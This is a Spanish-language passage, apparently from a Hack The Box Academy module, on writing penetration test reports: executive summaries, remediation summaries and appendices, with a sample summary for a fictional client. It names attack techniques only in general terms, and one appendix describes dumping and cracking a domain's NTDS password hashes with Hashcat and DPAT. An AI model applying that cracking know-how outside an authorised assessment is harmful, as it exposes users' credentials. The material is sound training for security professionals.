- `Describe the types of things you managed to access`- Es posible que su audiencia no tenga idea de lo que significa "Administrador de dominio", pero si menciona que obtuvo acceso a una cuenta que le permitió tener acceso a documentos de recursos humanos, sistemas bancarios y otros activos críticos, eso es universalmente comprensible.
    
- `Describe the general things that need to improve to mitigate the risks you discovered.`- Esto no debería ser "instala 3 parches y llámame en un año". Debería pensar en términos de "¿qué proceso falló que permitió que una vulnerabilidad de cinco años no se parcheara en una cuarta parte del entorno?". Si rocía contraseñas y obtiene 500 visitas en Bienvenido1!, cambiar las contraseñas de esas 500 cuentas es solo una parte de la solución. La otra parte probablemente sea proporcionar al servicio de asistencia técnica una forma de establecer contraseñas iniciales más seguras de manera eficiente.
    
- `If you're feeling brave and have a decent amount of experience on both sides, provide a general expectation for how much effort will be necessary to fix some of this.`- Si tiene una larga trayectoria como administrador de sistemas o ingeniero y sabe cuánta política interna puede tener que atravesar la gente para comenzar a manipular las políticas del grupo, es posible que desee intentar establecer una expectativa de niveles de tiempo bajos, moderados y significativos. y esfuerzo para corregir los problemas, de modo que un CEO demasiado entusiasta no le diga a su equipo de servidores que necesitan aplicar plantillas de refuerzo CIS a sus GPO durante el fin de semana sin probarlas primero.
    

#### No

- `Name or recommend specific vendors.`- El entregable es un documento técnico, no un documento de ventas. Es aceptable sugerir tecnologías como EDR o agregación de registros, pero evite recomendar proveedores específicos de esas tecnologías, como CrowdStrike y Splunk. Si tiene experiencia reciente con un proveedor en particular y se siente cómodo dándole esa retroalimentación al cliente, hágalo fuera de banda y asegúrese de dejar claro que debe tomar su propia decisión (y probablemente traer la cuenta del cliente). ejecutivo en esa discusión). Si describe vulnerabilidades específicas, es más probable que su lector reconozca algo como "proveedores como VMWare, Apache y Adobe" en lugar de "vSphere, Tomcat y Acrobat".
    
- `Use Acronyms.`- IP y VPN han alcanzado un nivel de ubicuidad que tal vez esté bien, pero el uso de siglas para protocolos y tipos de ataques (por ejemplo, SNMP, MitM) es algo sordo y hará que su resumen ejecutivo sea completamente ineficaz para su público objetivo.
    
- `Spend more time talking about stuff that doesn't matter than you do about the significant findings in the report.`- Está en tu poder dirigir la atención. No lo desperdicies en los problemas que descubriste y que no tuvieron tanto impacto.
    
- `Use words that no one has ever heard of before.`- Tener un vocabulario amplio es genial, pero si nadie puede entender lo que estás tratando de decir o tienen que buscar el significado de las palabras, todo lo que son es una distracción. Muéstralo en otro lugar.
    
- `Reference a more technical section of the report.`- La razón por la que el ejecutivo está leyendo esto podría ser porque no comprende los detalles técnicos o puede que decida que simplemente no tiene tiempo para ello. Además, a nadie le gusta tener que desplazarse hacia adelante y hacia atrás a lo largo del informe para descubrir qué está pasando.
    

#### Cambios de vocabulario

Para brindar algunos ejemplos de lo que significa "escribir a una audiencia no técnica", a continuación proporcionamos algunos ejemplos de términos técnicos y acrónimos que podría verse tentado a utilizar, junto con una alternativa menos técnica que podría usarse en su lugar. Esta lista no es exhaustiva ni es la forma "correcta" de describir estas cosas. Están pensados ​​como ejemplos de cómo se podría describir un tema técnico de una manera más universalmente comprensible.

- `VPN, SSH`- un protocolo utilizado para la administración remota segura
- `SSL/TLS`- tecnología utilizada para facilitar la navegación web segura
- `Hash`- el resultado de un algoritmo comúnmente utilizado para validar la integridad del archivo
- `Password Spraying`- un ataque en el que se intenta utilizar una contraseña única y fácil de adivinar para una gran lista de cuentas de usuarios recopiladas
- `Password Cracking`- un ataque de contraseña fuera de línea en el que la forma criptográfica de la contraseña de un usuario se convierte nuevamente a su forma legible por humanos
- `Buffer overflow/deserialization/etc.`- un ataque que resultó en la ejecución remota de comandos en el host de destino
- `OSINT`- Recopilación de inteligencia de código abierto, o búsqueda/uso de datos sobre una empresa y sus empleados que se pueden encontrar utilizando motores de búsqueda y otras fuentes públicas sin interactuar con la red externa de una empresa.
- `SQL injection/XSS`- una vulnerabilidad en la que se aceptan entradas del usuario sin desinfectar caracteres destinados a manipular la lógica de la aplicación de una manera no deseada

Estos son solo algunos ejemplos. Su glosario crecerá con el tiempo a medida que escriba más informes. También puedes mejorar esto en esta área leyendo los resúmenes ejecutivos que otros han escrito describiendo algunos de los mismos hallazgos que normalmente descubres. Hacerlo puede ser el catalizador para pensar en algo de una manera diferente. También puede recibir comentarios del cliente de vez en cuando sobre esto, y es importante recibir estos comentarios con gracia y con la mente abierta. Es posible que tenga la tentación de ponerse a la defensiva (especialmente si el cliente está siendo muy agresivo), pero al final del día, le pagaron para que le construyera un producto útil. Si no es porque no pueden entenderlo, considérelo como una oportunidad para practicar y crecer. Puede ser difícil no tomar los comentarios de los clientes como un ataque personal, pero es una de las cosas más valiosas que pueden brindarle.

---

## Ejemplo de resumen ejecutivo

A continuación se muestra un resumen ejecutivo de muestra tomado del informe de muestra incluido con este módulo:

Durante la prueba de penetración interna contra Inlanefreight, Hack The Box Academy identificó siete (7) hallazgos que amenazan la confidencialidad, integridad y disponibilidad de los sistemas de información de Inlanefreight. Los hallazgos se clasificaron por nivel de gravedad, a cinco (5) de los hallazgos se les asignó una calificación de alto riesgo, uno (1) de riesgo medio y uno (1) de riesgo bajo. También hubo un (1) hallazgo informativo relacionado con la mejora de las capacidades de monitoreo de seguridad dentro de la red interna.

El evaluador encontró que la gestión de vulnerabilidades y parches de Inlanefreight estaba en buen estado. Ninguno de los hallazgos de este informe estuvo relacionado con la falta de sistemas operativos o parches de terceros de vulnerabilidades conocidas en servicios y aplicaciones que podrían resultar en acceso no autorizado y compromiso del sistema. Cada falla descubierta durante las pruebas estaba relacionada con una mala configuración o falta de refuerzo, y la mayoría se clasificaba en las categorías de autenticación débil y autorización débil.

Un hallazgo involucró un protocolo de comunicación de red que puede ser "falsificado" para recuperar contraseñas de usuarios internos que pueden usarse para obtener acceso no autorizado si un atacante puede obtener acceso no autorizado a la red sin credenciales. En la mayoría de los entornos corporativos, este protocolo no es necesario y puede desactivarse. Está habilitado de forma predeterminada principalmente para pequeñas y medianas empresas que no tienen los recursos para un servidor de resolución de nombre de host dedicado (la “guía telefónica” de su red). Durante la evaluación, se observaron estos recursos en la red, por lo que Inlanefreight debería comenzar a formular un plan de prueba para desactivar el peligroso servicio.

El siguiente problema fue una configuración débil que involucraba cuentas de servicio y que permitía a cualquier usuario autenticado robar un componente del proceso de autenticación que a menudo se puede adivinar fuera de línea (mediante el “descifrado” de contraseñas) para revelar la forma legible por humanos de la contraseña de la cuenta. Estos tipos de cuentas de servicio suelen tener más privilegios que un usuario estándar, por lo que obtener una de sus contraseñas en texto claro podría resultar en un movimiento lateral o una escalada de privilegios y, finalmente, en un compromiso total de la red interna. El evaluador también notó que se usó la misma contraseña para el acceso de administrador a todos los servidores dentro de la red interna. Esto significa que si un servidor se ve comprometido, un atacante puede reutilizar esta contraseña para acceder a cualquier servidor que la comparta para acceso administrativo. Afortunadamente, ambos problemas se pueden corregir sin necesidad de herramientas de terceros. Active Directory de Microsoft contiene configuraciones que se pueden utilizar para minimizar el riesgo de que se abuse de estos recursos en beneficio de usuarios malintencionados.

También se descubrió que un servidor web ejecutaba una aplicación web que utilizaba credenciales débiles y fácilmente adivinables para acceder a una consola administrativa que se puede aprovechar para obtener acceso no autorizado al servidor subyacente. Esto podría ser aprovechado por un atacante en la red interna sin necesidad de una cuenta de usuario válida. Este ataque está muy bien documentado, por lo que es un objetivo muy probable que puede resultar especialmente dañino, incluso en manos de un atacante no cualificado. Lo ideal sería deshabilitar el acceso externo directo a este servicio, pero en caso de que no sea posible, se debe reconfigurar con credenciales excepcionalmente sólidas que se rotan con frecuencia. Es posible que Inlanefreight también desee considerar maximizar los datos de registro recopilados de este dispositivo para garantizar que los ataques contra él puedan detectarse y clasificarse rápidamente.

El evaluador también encontró carpetas compartidas con permisos excesivos, lo que significa que todos los usuarios de la red interna pueden acceder a una cantidad considerable de datos. Si bien compartir archivos internamente entre departamentos y usuarios es importante para las operaciones comerciales diarias, los permisos abiertos en archivos compartidos pueden resultar en la divulgación involuntaria de información confidencial. Incluso si un archivo compartido no contiene información confidencial hoy en día, alguien puede colocar esa información allí sin saberlo, pensando que está protegida cuando no lo está. Esta configuración debe cambiarse para garantizar que los usuarios puedan acceder solo a lo necesario para realizar sus tareas diarias.

Finalmente, el evaluador notó que las actividades de prueba parecieron pasar desapercibidas, lo que puede representar una oportunidad para mejorar la visibilidad de la red interna e indica que un atacante del mundo real podría pasar desapercibido si se logra el acceso interno. Inlanefreight debe crear un plan de remediación basado en la sección Resumen de remediación de este informe, abordando todos los hallazgos importantes lo antes posible de acuerdo con las necesidades de la empresa. Inlanefreight también debería considerar realizar evaluaciones periódicas de vulnerabilidad si aún no se están realizando. Una vez que se hayan abordado los problemas identificados en este informe, una evaluación de seguridad de Active Directory más colaborativa y profunda puede ayudar a identificar oportunidades adicionales para fortalecer el entorno de Active Directory, haciendo más difícil para los atacantes moverse por la red y aumentando la probabilidad de que Inlanefreight podrá detectar y responder a actividades sospechosas.

#### Anatomía del resumen ejecutivo

Ese muro de texto es genial y todo eso, pero ¿cómo llegamos allí? Echemos un vistazo al proceso de pensamiento, ¿de acuerdo? Para este análisis, usaremos el informe de muestra que puede descargar de la `Resources`lista.

Lo primero que probablemente querrá hacer es reunir una lista de sus hallazgos e intentar categorizar la naturaleza del riesgo de cada uno. Estas categorías serán la base de lo que discutirá en el resumen ejecutivo. En nuestro informe de muestra, tenemos los siguientes hallazgos:

- Falsificación de respuesta de LLMNR/NBT-NS -`configuration change/system hardening`
- Autenticación Kerberos débil (“Kerberoasting”) -`configuration change/system hardening`
- Reutilización de la contraseña del administrador local -`behavioral/system hardening`
- Contraseñas débiles de Active Directory -`behavioral`
- Tomcat Manager Débil/Credenciales predeterminadas altas -`configuration change/system hardening`
- Recursos compartidos de archivos inseguros -`configuration change/system hardening/permissions`
- Listado de directorios habilitado -`configuration change/system hardening`
- Mejorar las capacidades de monitoreo de seguridad -`configuration change/system hardening`

En primer lugar, es notable que no hay ningún problema en esta lista relacionado con parches faltantes, lo que indica que el cliente puede haber dedicado un tiempo y esfuerzo considerables a madurar ese proceso. Cualquiera que haya sido administrador de sistemas antes sabrá que esto no es poca cosa, por lo que queremos asegurarnos de reconocer sus esfuerzos. Esto le hace ganarse el cariño del equipo de administradores de sistemas al mostrarles a sus ejecutivos que el trabajo que han estado haciendo ha sido efectivo y los alienta a continuar invirtiendo en personas y tecnología que puedan ayudarlos a corregir algunos de sus problemas.

Volviendo a nuestros hallazgos, puede ver que casi todos los hallazgos tienen algún tipo de cambio de configuración o resolución de refuerzo del sistema. Para simplificarlo aún más, se podría comenzar a concluir que este cliente en particular tiene un proceso de administración de configuración inmaduro (es decir, no hacen un muy buen trabajo al cambiar las configuraciones predeterminadas de nada antes de ponerlo en producción). Dado que hay mucho que desglosar en ocho hallazgos, probablemente no quieras escribir simplemente un párrafo que diga "configurar mejor las cosas". Tienes algo de espacio para abordar algunos temas individuales y describir parte del impacto (la atención -agarrar cosas) de algunos de los hallazgos más dañinos. Desarrollar un proceso de gestión de la configuración requerirá mucho trabajo, por lo que es importante describir lo que sucedió o podría suceder si este problema no se controla.

A medida que lea cada párrafo, probablemente podrá asignar la descripción de alto nivel al hallazgo asociado para darle una idea de cómo describir algunos de los términos más técnicos de una manera que una audiencia no técnica pueda seguir sin tener que buscar cosas. Notarás que no usamos siglas, no hablamos de protocolos, no mencionamos tickets que otorgan otros tickets, ni nada por el estilo. En algunos casos, también describimos anécdotas generales sobre el nivel de esfuerzo que se debe esperar de la remediación, los cambios que se deben realizar con cautela, las soluciones alternativas para monitorear una amenaza determinada y el nivel de habilidad requerido para realizar la explotación. NO es necesario tener un párrafo para cada hallazgo. Si tiene un informe con 20 hallazgos, eso se saldría de control rápidamente. Intente centrarse en los más impactantes.

Un par de matices a mencionar también:

- Ciertas observaciones que usted haga durante la evaluación pueden indicar un problema más importante que el cliente quizás no conozca. Obviamente es valioso proporcionar este análisis, pero debe tener cuidado en cómo está redactado para asegurarse de no hablar en términos absolutos debido a una suposición.
- Al final, verá un párrafo sobre cómo **parece** e **indica que** el cliente no detectó nuestra actividad de prueba. Estos calificadores son importantes porque no estás absolutamente seguro de que no lo hayan hecho. Es posible que simplemente no le hayan dicho que sí.
- Otro ejemplo de esto (en general, no en este resumen ejecutivo) sería si escribiera algo en el sentido de "comenzar a documentar las plantillas y procesos de fortalecimiento del sistema". Esto insinúa que no han hecho nada, lo que podría resultar insultante si realmente lo intentaran y fracasaran. En su lugar, podría decir "revisar los procesos de gestión de la configuración y abordar las brechas que llevaron a los problemas identificados en este informe".

Con suerte, esto ayudará a aclarar algunos de los procesos de pensamiento necesarios para escribir esto y le brindará algunas ideas sobre cómo pensar en las cosas de manera diferente al intentar describirlas. Las palabras tienen significado, así que asegúrese de elegirlas con cuidado.

---

## Resumen de recomendaciones

Antes de entrar en los hallazgos técnicos, es una buena idea proporcionar una sección `Summary of Recommendations`o `Remediation Summary`. Aquí podemos enumerar nuestras recomendaciones a corto, mediano y largo plazo basadas en nuestros hallazgos y el estado actual del entorno del cliente. Necesitaremos utilizar nuestra experiencia y conocimiento del negocio del cliente, presupuesto de seguridad, consideraciones de personal, etc., para hacer recomendaciones precisas. Nuestros clientes a menudo tendrán comentarios sobre esta sección, por lo que queremos hacerlo bien o las recomendaciones serán inútiles. Si estructuramos esto adecuadamente, nuestros clientes pueden usarlo como base para una hoja de ruta de remediación. Si opta por no hacer esto, esté preparado para que los clientes le pidan que les dé prioridad a la remediación. Puede que no suceda todo el tiempo, pero si tiene un informe con 15 hallazgos de alto riesgo y nada más, es probable que quieran saber cuál de ellos es "el más alto". Como dice el refrán, "cuando todo es importante, nada es importante".

Deberíamos vincular cada recomendación a un hallazgo específico y no incluir ninguna recomendación a corto o mediano plazo que no sea procesable al remediar los hallazgos reportados más adelante en el informe. Las recomendaciones a largo plazo pueden corresponder a recomendaciones informativas/de mejores prácticas, como, por ejemplo, `"Create baseline security templates for Windows Server and Workstation hosts"`pero también pueden ser recomendaciones generales, como`"Perform periodic Social Engineering engagements with follow-on debriefings and security awareness training to build a security-focused culture within the organization from the top down."`

Algunos hallazgos podrían tener una recomendación asociada a corto y largo plazo. Por ejemplo, si falta un parche en particular en muchos lugares, es una señal de que la organización tiene dificultades con la administración de parches y tal vez no tenga un programa sólido de administración de parches, junto con las políticas y procedimientos asociados. La solución a corto plazo sería lanzar los parches relevantes, mientras que el objetivo a largo plazo sería revisar los procesos de gestión de parches y vulnerabilidades para abordar cualquier brecha que impida que vuelva a surgir el mismo problema. En el mundo de la seguridad de las aplicaciones, en cambio, podría consistir en corregir el código a corto y largo plazo, revisando el SDLC para garantizar que la seguridad se considere lo suficientemente temprano en el proceso de desarrollo para evitar que estos problemas lleguen a producción.

---

## Recomendaciones

Después del Resumen Ejecutivo, la `Findings`sección es una de las más importantes. Esta sección nos brinda la oportunidad de mostrar nuestro trabajo, presentarle al cliente una imagen del riesgo para su entorno, brindar a los equipos técnicos la evidencia para validar y reproducir problemas y brindar consejos de solución. Analizaremos esta sección del informe en detalle en la siguiente sección de este módulo: [Cómo redactar un hallazgo](https://academy.hackthebox.com/module/162/section/1536) .

---

## Apéndices

Hay apéndices que deberían aparecer en cada informe, pero otros serán dinámicos y es posible que no sean necesarios para todos los informes. Si alguno de estos apéndices aumenta innecesariamente el tamaño del informe, es posible que desee considerar si una hoja de cálculo complementaria sería una mejor manera de presentar los datos (sin mencionar la capacidad mejorada para ordenar y filtrar).

---

## Apéndices estáticos

#### Alcance

Muestra el alcance de la evaluación (URL, rangos de red, instalaciones, etc.). La mayoría de los auditores a los que el cliente debe entregar su informe necesitarán ver esto.

#### Metodología

Explique el proceso repetible que sigue para garantizar que sus evaluaciones sean exhaustivas y consistentes.

#### Clasificaciones de gravedad

Si sus clasificaciones de gravedad no se corresponden directamente con una puntuación CVSS o algo similar, deberá articular los criterios necesarios para cumplir con sus definiciones de gravedad. Tendrá que defender esto de vez en cuando, así que asegúrese de que sea sólido y pueda respaldarse con lógica y que los hallazgos que incluya en su informe estén calificados en consecuencia.

#### Biografías

Si realiza evaluaciones con la intención de cumplir específicamente con el PCI, el informe debe incluir una biografía sobre el personal que realiza la evaluación con el objetivo específico de expresar que el consultor está adecuadamente calificado para realizar la evaluación. Incluso sin obligaciones de cumplimiento, puede ayudar a que el cliente tenga la tranquilidad de saber que la persona que realiza la evaluación sabía lo que estaba haciendo.

---

## Apéndices dinámicos

#### Intentos de explotación y cargas útiles

Si alguna vez ha hecho algo en respuesta a incidentes, debe saber cuántos artefactos quedan después de una prueba de penetración para que los forenses intenten examinarlos. Sea respetuoso y realice un seguimiento de lo que hizo para que, si experimentan un incidente, puedan diferenciar lo que era usted de lo que fue un atacante real. Si genera cargas útiles personalizadas, especialmente si las coloca en el disco, también debe incluir los detalles de esas cargas aquí, para que el cliente sepa exactamente dónde ir y qué buscar para deshacerse de ellas. Esto es especialmente importante para cargas útiles que no puede limpiar usted mismo.

#### Credenciales comprometidas

Si se vio comprometida una gran cantidad de cuentas, es útil enumerarlas aquí (si compromete todo el dominio, podría ser un esfuerzo inútil enumerar todas las cuentas de usuario en lugar de simplemente decir "todas las cuentas de dominio") para que el cliente puede tomar medidas contra ellos si es necesario.

#### Cambios de configuración

Si realizó algún cambio de configuración en el entorno del cliente (es de esperar que haya preguntado primero), debe detallarlos todos para que el cliente pueda revertirlos y eliminar cualquier riesgo que haya introducido en el entorno (como deshabilitar EDR o algo así). Obviamente, es ideal si vuelves a colocar las cosas como las encontraste y obtienes la aprobación por escrito del cliente para cambiar las cosas y evitar que te griten más adelante si tu cambio tiene consecuencias no deseadas para un proceso de generación de ingresos.

#### Alcance afectado adicional

Si tiene un hallazgo con una lista de hosts afectados que sería demasiado incluir con el hallazgo en sí, generalmente puede hacer referencia a un apéndice en el hallazgo para ver una lista completa de los hosts afectados donde puede crear una tabla para mostrarlos. en varias columnas. Esto ayuda a mantener el informe limpio en lugar de tener una lista con viñetas de varias páginas.

#### Recopilación de información

Si la evaluación es una prueba de penetración externa, podemos incluir datos adicionales para ayudar al cliente a comprender su huella externa. Esto podría incluir datos whois, información de propiedad del dominio, subdominios, correos electrónicos descubiertos, cuentas encontradas en datos de violaciones públicas ( [DeHashed](https://www.dehashed.com/) es excelente para esto), un análisis de las configuraciones SSL/TLS del cliente e incluso una lista de puertos/servicios accesibles externamente ( en un ámbito externo de gran alcance, es probable que desee crear una hoja de cálculo complementaria). Estos datos pueden ser beneficiosos en un informe con pocos o ningún hallazgo, pero deben transmitir algún tipo de valor al cliente y no ser simplemente "tonterías".

#### Análisis de contraseña de dominio

Si puede obtener acceso de administrador de dominio y volcar la base de datos NTDS, es una buena idea ejecutar esto a través de Hashcat con múltiples listas de palabras y reglas e incluso forzar NTLM con fuerza bruta hasta ocho caracteres si su plataforma para descifrar contraseñas es lo suficientemente potente. Una vez que haya agotado sus intentos de descifrado, se puede utilizar una herramienta como [DPAT para producir un buen informe con varias estadísticas.](https://github.com/clr2of8/DPAT) Es posible que desee incluir simplemente algunas estadísticas clave de este informe (es decir, número de hashes obtenidos, número y porcentaje descifrados, número de cuentas privilegiadas descifradas (piense en administradores de dominio y administradores empresariales), X contraseñas principales y la cantidad de contraseñas descifradas para longitud de cada carácter). Esto puede ayudar a resaltar los temas en las secciones Resumen ejecutivo y Hallazgos sobre contraseñas débiles. También es posible que desee proporcionar al cliente el informe DPAT completo como datos complementarios.

---

## Diferencias de tipos de informes

En este módulo, cubrimos principalmente todos los elementos que deben incluirse en un informe de Prueba de Penetración Interna o una Prueba de Penetración Externa que terminó con un compromiso interno. Es probable que algunos de los elementos del informe (como la cadena de ataque) no se apliquen en un informe de prueba de penetración externa donde no hubo compromiso interno. Este tipo de informe se centraría más en la recopilación de información, los datos OSINT y los servicios expuestos externamente. Probablemente no incluya apéndices como credenciales comprometidas, cambios de configuración o un análisis de contraseña de dominio. Un informe de Evaluación de seguridad de aplicaciones web (WASA) probablemente se centraría principalmente en las secciones Resumen ejecutivo y Hallazgos y probablemente enfatizaría el Top 10 de OWASP. Una evaluación de seguridad física, una evaluación del equipo rojo o un compromiso de ingeniería social se escribirían de forma más narrativa. formato. Es una buena práctica crear plantillas para varios tipos de evaluaciones, de modo que las tenga listas para usar cuando surja ese tipo de evaluación en particular.

Ahora que hemos cubierto los elementos de un informe, profundicemos en cómo redactar un hallazgo de manera eficaz.